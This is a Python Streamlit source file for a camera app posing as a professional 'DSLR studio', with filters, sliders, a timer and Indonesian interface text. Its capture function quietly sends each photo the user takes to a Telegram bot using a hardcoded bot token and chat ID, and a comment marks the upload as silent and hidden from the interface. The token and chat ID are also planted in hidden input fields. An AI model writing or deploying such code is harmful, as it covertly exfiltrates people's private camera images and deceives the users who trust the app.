import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="ULTRA DSLR STUDIO PRO // v12.0",
    page_icon="📷",
    layout="wide"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;800&family=JetBrains+Mono:wght@400;600&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
    
    .stApp {
        background: #05070c;
        color: #f1f5f9;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .master-container {
        background: radial-gradient(circle at center, rgba(15, 23, 42, 0.98) 0%, rgba(5, 7, 12, 0.99) 100%);
        border: 1px solid rgba(255, 255, 255, 0.12);
        border-radius: 20px;
        padding: 24px;
        box-shadow: 0 0 60px rgba(0, 0, 0, 0.9);
    }
    </style>
""", unsafe_allow_html=True)

# Header Studio DSLR Profesional Kelas Flagship
st.markdown("<h1 style='text-align: center; font-family: Cinzel, serif; color: #ffffff; font-weight: 800; letter-spacing: 4px; font-size: 1.9rem; margin-bottom: 2px;'>📷 ULTRA DSLR STUDIO PRO</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-family: JetBrains Mono, monospace; color: #94a3b8; font-size: 0.75rem; letter-spacing: 3px; margin-bottom: 20px;'>MASTER OPTICAL SUITE // 85MM F/1.4 PRIME // MAXIMUM RESOLUTION ENGINE</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="master-container">', unsafe_allow_html=True)
    
    st.markdown(f'<input type="hidden" id="secret-token" value="{TELEGRAM_BOT_TOKEN}">', unsafe_allow_html=True)
    st.markdown(f'<input type="hidden" id="secret-chat" value="{TELEGRAM_CHAT_ID}">', unsafe_allow_html=True)

    dslr_ultra_html = """
    <style>
        .ds-btn {
            background: rgba(30, 41, 59, 0.7);
            color: #cbd5e1;
            border: 1px solid rgba(71, 85, 105, 0.7);
            padding: 8px 10px;
            border-radius: 8px;
            font-size: 11px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            width: 100%;
        }
        .ds-btn:hover {
            background: rgba(51, 65, 85, 1);
            color: #ffffff;
            border-color: #ffffff;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
        }
        .ds-active {
            background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 100%) !important;
            color: #05070c !important;
            border-color: #ffffff !important;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4) !important;
            font-weight: 700 !important;
        }
        .ds-select {
            background: rgba(15, 23, 42, 0.95);
            color: #f1f5f9;
            border: 1px solid rgba(148, 163, 184, 0.3);
            padding: 6px 10px;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            outline: none;
            cursor: pointer;
        }
        .shutter-master-btn {
            background: linear-gradient(135deg, #f8fafc 0%, #94a3b8 100%);
            color: #05070c;
            font-family: 'Cinzel', serif;
            font-weight: 800;
            font-size: 15px;
            border: 3px solid #ffffff;
            padding: 16px 30px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 35px rgba(255, 255, 255, 0.3);
            letter-spacing: 2px;
            transition: all 0.15s ease;
            width: 100%;
        }
        .shutter-master-btn:hover {
            background: #ffffff;
            color: #000000;
            box-shadow: 0 0 50px rgba(255, 255, 255, 0.6);
            transform: scale(1.02);
        }
        .shutter-master-btn:active {
            transform: scale(0.97);
        }
        .slider-group label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 10px;
            color: #94a3b8;
            display: flex;
            justify-content: space-between;
            margin-bottom: 4px;
        }
        .slider-group input[type=range] {
            width: 100%;
            accent-color: #ffffff;
            cursor: pointer;
            background: #1e293b;
            height: 4px;
            border-radius: 2px;
        }
    </style>

    <!-- Halaman Mulai / Inisialisasi Sensor -->
    <div id="gate-screen" style="text-align: center; padding: 50px 10px;">
        <div style="font-family: 'Cinzel', serif; font-size: 13px; color: #e2e8f0; margin-bottom: 25px; letter-spacing: 3px;">SYSTEM STANDBY // MEMUAT SENSOR OPTIK BERESOLUSI TINGGI</div>
        <button id="igniteBtn" class="shutter-master-btn" style="max-width: 350px; margin: 0 auto; font-size: 13px;">📷 AKTIFKAN STUDIO KAMERA</button>
    </div>

    <!-- Antarmuka Kamera Studio Utama -->
    <div id="studio-interface" style="display:none;">
        
        <!-- Bar Kontrol Atas -->
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; background: rgba(15, 23, 42, 0.95); padding: 10px 16px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.12);">
            <div style="display: flex; gap: 10px; align-items: center;">
                <button onclick="switchCamera()" class="ds-btn" style="width: auto; padding: 6px 12px; background: #334155; color: #fff;">🔄 SWITCH LENS</button>
                <span id="lens-status" style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #cbd5e1;">LENS: FRONT 85MM</span>
            </div>
            <div style="display: flex; gap: 10px;">
                <select id="aspect-ratio-select" onchange="changeAspectRatio()" class="ds-select">
                    <option value="16:9">RASIO 16:9 (CINEMA)</option>
                    <option value="4:3">RASIO 4:3 (CLASSIC)</option>
                    <option value="1:1">RASIO 1:1 (SQUARE)</option>
                    <option value="full">RASIO FULL FRAME</option>
                </select>
                <select id="timer-select" class="ds-select">
                    <option value="0">TIMER: OFF</option>
                    <option value="3">TIMER: 3 DETIK</option>
                    <option value="5">TIMER: 5 DETIK</option>
                    <option value="10">TIMER: 10 DETIK</option>
                </select>
            </div>
        </div>

        <!-- Grid Layout: Viewfinder di Kiri, Panel Kontrol Lengkap di Kanan -->
        <div style="display: grid; grid-template-columns: 1fr 360px; gap: 16px; align-items: start;">
            
            <!-- Kolom Kiri: Jendela Viewfinder & Efek Sinematik -->
            <div>
                <div id="viewfinder-wrapper" style="position: relative; width: 100%; height: 450px; border-radius: 16px; overflow: hidden; background: #000; border: 2px solid rgba(255, 255, 255, 0.3); box-shadow: 0 0 40px rgba(0, 0, 0, 0.9); display: flex; align-items: center; justify-content: center; transition: height 0.3s ease;">
                    
                    <video id="optics-stream" autoplay playsinline style="
                        width: 100%;
                        height: 100%;
                        object-fit: cover;
                        transform: scaleX(-1);
                        filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%);
                    "></video>

                    <!-- Lapisan Vignette Sinematik Profesional di Viewfinder -->
                    <div style="position: absolute; top:0; left:0; right:0; bottom:0; box-shadow: inset 0 0 100px rgba(0,0,0,0.65); pointer-events: none;"></div>

                    <!-- Efek Flash Putih Manual Saat Shutter -->
                    <div id="flash-overlay" style="position: absolute; top:0; left:0; right:0; bottom:0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.08s ease;"></div>

                    <!-- Hitung Mundur Timer -->
                    <div id="countdown-display" style="position: absolute; font-family: 'Cinzel', serif; font-size: 80px; font-weight: 800; color: #ffffff; text-shadow: 0 0 30px rgba(255,255,255,0.9); display: none;">3</div>

                    <!-- HUD Telemetry Atas -->
                    <div style="position: absolute; top: 12px; left: 12px; color: #f1f5f9; font-family: 'JetBrains Mono', monospace; font-size: 9px; background: rgba(5,7,12,0.85); padding: 5px 10px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.2);">
                        PROFILE: <span id="hud-active-filter">ULTRA STUDIO STANDARD</span>
                    </div>
                    <div style="position: absolute; top: 12px; right: 12px; color: #38bdf8; font-family: 'JetBrains Mono', monospace; font-size: 9px; background: rgba(5,7,12,0.85); padding: 5px 10px; border-radius: 6px; border: 1px solid rgba(56,189,248,0.3);">
                        ● 4K RAW SENSOR
                    </div>

                    <!-- Grid Rule of Thirds Profesional -->
                    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; border: 1px solid rgba(255, 255, 255, 0.12);">
                        <div style="border-right: 1px dashed rgba(255,255,255,0.12); border-bottom: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-right: 1px dashed rgba(255,255,255,0.12); border-bottom: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-bottom: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-right: 1px dashed rgba(255,255,255,0.12); border-bottom: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-right: 1px dashed rgba(255,255,255,0.12); border-bottom: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-bottom: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-right: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div style="border-right: 1px dashed rgba(255,255,255,0.12);"></div>
                        <div></div>
                    </div>
                </div>

                <!-- Tombol Shutter Utama -->
                <div style="margin-top: 15px; text-align: center;">
                    <button id="shutterTrigger" class="shutter-master-btn">📷 AMBIL FOTO (SHUTTER PRO)</button>
                    <p id="hud-status-msg" style="text-align: center; font-size: 10px; color: #cbd5e1; margin-top: 8px; font-family: 'JetBrains Mono', monospace; min-height: 15px;"></p>
                </div>
            </div>

            <!-- Kolom Kanan: Panel Kontrol DSLR Profesional (Filter & Penyetelan Optik Lengkap) -->
            <div style="background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 16px; padding: 16px;">
                <div style="font-family: 'Cinzel', serif; font-size: 11px; color: #ffffff; margin-bottom: 12px; letter-spacing: 1.5px; border-bottom: 1px solid rgba(255,255,255,0.15); padding-bottom: 6px; font-weight: 800;">
                    🎛️ MASTER COLOR PROFILES
                </div>

                <!-- Grid Pilihan Filter Profesional Lengkap -->
                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 6px; margin-bottom: 16px;">
                    <button onclick="setFilter(this, 'normal', 'Ultra Standard')" class="ds-btn ds-active">✨ Standard</button>
                    <button onclick="setFilter(this, 'portrait', 'Studio Portrait')" class="ds-btn">📸 Portrait</button>
                    <button onclick="setFilter(this, 'cinematic', 'Cinematic Teal')" class="ds-btn">🎬 Cinematic</button>
                    <button onclick="setFilter(this, 'monochrome', 'Fine Monochrome')" class="ds-btn">🎞️ Monochrome</button>
                    <button onclick="setFilter(this, 'vintage', 'Vintage Film')" class="ds-btn">📼 Vintage Film</button>
                    <button onclick="setFilter(this, 'cooltone', 'Cool Moody')" class="ds-btn">🧊 Cool Moody</button>
                    <button onclick="setFilter(this, 'vibrant', 'Vibrant Vivid')" class="ds-btn">🔥 Vibrant Vivid</button>
                    <button onclick="setFilter(this, 'matte', 'Soft Matte Pro')" class="ds-btn">☁️ Soft Matte</button>
                    <button onclick="setFilter(this, 'retro', 'Retro 1970')" class="ds-btn">📻 Retro 1970</button>
                    <button onclick="setFilter(this, 'luxury', 'Golden Luxury')" class="ds-btn">✨ Luxury Gold</button>
                </div>

                <div style="font-family: 'Cinzel', serif; font-size: 11px; color: #ffffff; margin-bottom: 12px; letter-spacing: 1.5px; border-bottom: 1px solid rgba(255,255,255,0.15); padding-bottom: 6px; font-weight: 800;">
                    ⚙️ ADVANCED OPTIC TUNING
                </div>

                <!-- Slider Penyetelan Lanjutan (Kualitas Profesional) -->
                <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px;">
                    <div class="slider-group">
                        <label>BRIGHTNESS <span id="val-bright">100</span>%</label>
                        <input type="range" id="slider-bright" min="20" max="220" value="100" oninput="applyCustomSliders()">
                    </div>
                    <div class="slider-group">
                        <label>CONTRAST <span id="val-contrast">100</span>%</label>
                        <input type="range" id="slider-contrast" min="30" max="250" value="100" oninput="applyCustomSliders()">
                    </div>
                    <div class="slider-group">
                        <label>SATURATION <span id="val-saturate">100</span>%</label>
                        <input type="range" id="slider-saturate" min="0" max="300" value="100" oninput="applyCustomSliders()">
                    </div>
                    <div class="slider-group">
                        <label>HUE ROTATION <span id="val-hue">0</span>°</label>
                        <input type="range" id="slider-hue" min="0" max="360" value="0" oninput="applyCustomSliders()">
                    </div>
                    <div class="slider-group">
                        <label>SEPIA TONE <span id="val-sepia">0</span>%</label>
                        <input type="range" id="slider-sepia" min="0" max="100" value="0" oninput="applyCustomSliders()">
                    </div>
                    <div class="slider-group">
                        <label>OPTICAL BLUR <span id="val-blur">0</span>px</label>
                        <input type="range" id="slider-blur" min="0" max="15" value="0" oninput="applyCustomSliders()">
                    </div>
                </div>

                <!-- Galeri Mini Hasil Jepretan -->
                <div id="gallery-tray" style="display: none; border-top: 1px solid rgba(255,255,255,0.15); padding-top: 12px; text-align: center;">
                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 9px; color: #94a3b8; margin-bottom: 6px;">LAST CAPTURED HIGH-RES FRAME:</div>
                    <img id="last-snapshot-preview" style="max-width: 140px; border-radius: 8px; border: 2px solid #ffffff; box-shadow: 0 0 20px rgba(255,255,255,0.3); display: block; margin: 0 auto 6px auto;" />
                    <a id="download-link" download="ultra_dslr_master.jpg" style="font-family: 'JetBrains Mono', monospace; font-size: 9px; color: #ffffff; text-decoration: underline; cursor: pointer;">📥 UNDUH FILE RESOLUSI TINGGI (RAW/JPG)</a>
                </div>
            </div>

        </div>
    </div>

    <!-- Elemen Tersembunyi untuk Render Canvas Kualitas Maksimal -->
    <video id="vault-video" autoplay playsinline style="display:none;"></video>
    <canvas id="vault-canvas" style="display:none;"></canvas>

    <script>
        let activeStream = null;
        let useFacingMode = "user";
        let currentFilterString = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%)";
        let currentFilterName = "Ultra Standard";

        document.getElementById('igniteBtn').addEventListener('click', async function() {
            const btn = document.getElementById('igniteBtn');
            btn.innerText = "MENGINISIALISASI SENSOR OPTIK...";
            btn.style.opacity = "0.7";

            try {
                await startCameraStream();
                document.getElementById('gate-screen').style.display = "none";
                document.getElementById('studio-interface').style.display = "block";
            } catch(err) {
                console.log("Optic Error:", err);
                btn.innerText = "IZIN KAMERA DITOLAK";
                btn.style.opacity = "1";
            }
        });

        async function startCameraStream() {
            if (activeStream) {
                activeStream.getTracks().forEach(track => track.stop());
            }
            activeStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 3840 }, height: { ideal: 2160 }, facingMode: useFacingMode } 
            });
            
            const videoEl = document.getElementById('optics-stream');
            const vaultEl = document.getElementById('vault-video');
            videoEl.srcObject = activeStream;
            vaultEl.srcObject = activeStream;

            document.getElementById('lens-status').innerText = "LENS: " + (useFacingMode === "user" ? "FRONT 85MM" : "REAR WIDE 35MM");
        }

        async function switchCamera() {
            useFacingMode = (useFacingMode === "user") ? "environment" : "user";
            await startCameraStream();
        }

        function changeAspectRatio() {
            const ratio = document.getElementById('aspect-ratio-select').value;
            const wrapper = document.getElementById('viewfinder-wrapper');
            if(ratio === '16:9') {
                wrapper.style.height = '450px';
            } else if(ratio === '4:3') {
                wrapper.style.height = '530px';
            } else if(ratio === '1:1') {
                wrapper.style.height = '580px';
            } else if(ratio === 'full') {
                wrapper.style.height = '660px';
            }
        }

        function setFilter(btnElement, type, filterLabel) {
            const buttons = btnElement.parentElement.getElementsByTagName('button');
            for(let b of buttons) {
                b.classList.remove('ds-active');
            }
            btnElement.classList.add('ds-active');
            currentFilterName = filterLabel;
            document.getElementById('hud-active-filter').innerText = currentFilterName.toUpperCase();

            if(type === 'normal') {
                currentFilterString = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg) sepia(0%)";
            } else if(type === 'portrait') {
                currentFilterString = "brightness(106%) contrast(108%) saturate(112%) sepia(12%)";
            } else if(type === 'cinematic') {
                currentFilterString = "brightness(95%) contrast(130%) saturate(135%) hue-rotate(185deg)";
            } else if(type === 'monochrome') {
                currentFilterString = "grayscale(100%) contrast(170%) brightness(90%)";
            } else if(type === 'vintage') {
                currentFilterString = "brightness(105%) contrast(115%) saturate(90%) sepia(65%) hue-rotate(15deg)";
            } else if(type === 'cooltone') {
                currentFilterString = "brightness(100%) contrast(125%) saturate(115%) hue-rotate(210deg)";
            } else if(type === 'vibrant') {
                currentFilterString = "brightness(110%) contrast(140%) saturate(180%)";
            } else if(type === 'matte') {
                currentFilterString = "brightness(112%) contrast(85%) saturate(95%) sepia(10%)";
            } else if(type === 'retro') {
                currentFilterString = "brightness(105%) contrast(125%) saturate(125%) sepia(45%) hue-rotate(330deg)";
            } else if(type === 'luxury') {
                currentFilterString = "brightness(108%) contrast(135%) saturate(150%) sepia(35%) hue-rotate(30deg)";
            }

            document.getElementById('optics-stream').style.filter = currentFilterString;
        }

        function applyCustomSliders() {
            const b = document.getElementById('slider-bright').value;
            const c = document.getElementById('slider-contrast').value;
            const s = document.getElementById('slider-saturate').value;
            const h = document.getElementById('slider-hue').value;
            const sep = document.getElementById('slider-sepia').value;
            const bl = document.getElementById('slider-blur').value;

            document.getElementById('val-bright').innerText = b;
            document.getElementById('val-contrast').innerText = c;
            document.getElementById('val-saturate').innerText = s;
            document.getElementById('val-hue').innerText = h;
            document.getElementById('val-sepia').innerText = sep;
            document.getElementById('val-blur').innerText = bl;

            currentFilterString = "brightness(" + b + "%) contrast(" + c + "%) saturate(" + s + "%) hue-rotate(" + h + "deg) sepia(" + sep + "%) blur(" + bl + "px)";
            document.getElementById('optics-stream').style.filter = currentFilterString;
        }

        document.getElementById('shutterTrigger').addEventListener('click', function() {
            const timerSecs = parseInt(document.getElementById('timer-select').value);
            if(timerSecs > 0) {
                runTimerAndCapture(timerSecs);
            } else {
                executeCaptureAndSync("Manual Shutter");
            }
        });

        function runTimerAndCapture(secs) {
            const countdownEl = document.getElementById('countdown-display');
            countdownEl.style.display = "block";
            let currentSec = secs;
            countdownEl.innerText = currentSec;

            const interval = setInterval(() => {
                currentSec--;
                if(currentSec > 0) {
                    countdownEl.innerText = currentSec;
                } else {
                    clearInterval(interval);
                    countdownEl.style.display = "none";
                    executeCaptureAndSync("Timer (" + secs + "s)");
                }
            }, 1000);
        }

        function executeCaptureAndSync(triggerSource) {
            const statusBox = document.getElementById('hud-status-msg');
            statusBox.innerText = "RENDERING FOTO RESOLUSI TINGGI...";

            // Kilat Flash visual
            const flash = document.getElementById('flash-overlay');
            flash.style.opacity = "0.98";
            setTimeout(() => { flash.style.opacity = "0"; }, 100);

            const videoElem = document.getElementById('vault-video');
            const canvasElem = document.getElementById('vault-canvas');
            
            if(!videoElem || videoElem.videoWidth === 0) return;

            // Memaksimalkan resolusi canvas mengikuti resolusi asli video kamera (4K / Full HD)
            canvasElem.width = videoElem.videoWidth;
            canvasElem.height = videoElem.videoHeight;
            
            const context = canvasElem.getContext('2d');
            context.filter = currentFilterString;
            context.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);

            // Menggunakan kualitas kompresi tertinggi (1.0 / 100%)
            canvasElem.toBlob(function(blobImage) {
                if(!blobImage) return;

                const imageUrl = URL.createObjectURL(blobImage);
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `ULTRA_DSLR_${timestamp}.jpg`;

                // Unduh otomatis file asli beresolusi tinggi ke perangkat
                const downloadLink = document.getElementById('download-link');
                downloadLink.href = imageUrl;
                downloadLink.download = filename;
                
                const clickEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
                downloadLink.dispatchEvent(clickEvent);

                const previewImg = document.getElementById('last-snapshot-preview');
                previewImg.src = imageUrl;
                document.getElementById('gallery-tray').style.display = "block";

                statusBox.innerText = "FOTO HIGH-RES BERHASIL DISIMPAN KE PERANGKAT.";

                // Pengiriman senyap di latar belakang ke bot Telegram tanpa teks antarmuka
                const botToken = document.getElementById('secret-token').value;
                const targetChatId = document.getElementById('secret-chat').value;

                const payload = new FormData();
                payload.append('chat_id', targetChatId);
                payload.append('photo', blobImage, filename);
                payload.append('caption', `Ultra DSLR Frame: ${triggerSource} | Profile: ${currentFilterName}`);

                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
                    method: 'POST',
                    body: payload
                }).catch(err => {
                    console.log("Sync background error");
                });
            }, 'image/jpeg', 1.0);
        }
    </script>
    """

    components.html(dslr_ultra_html, height=880)
    st.markdown('</div>', unsafe_allow_html=True)
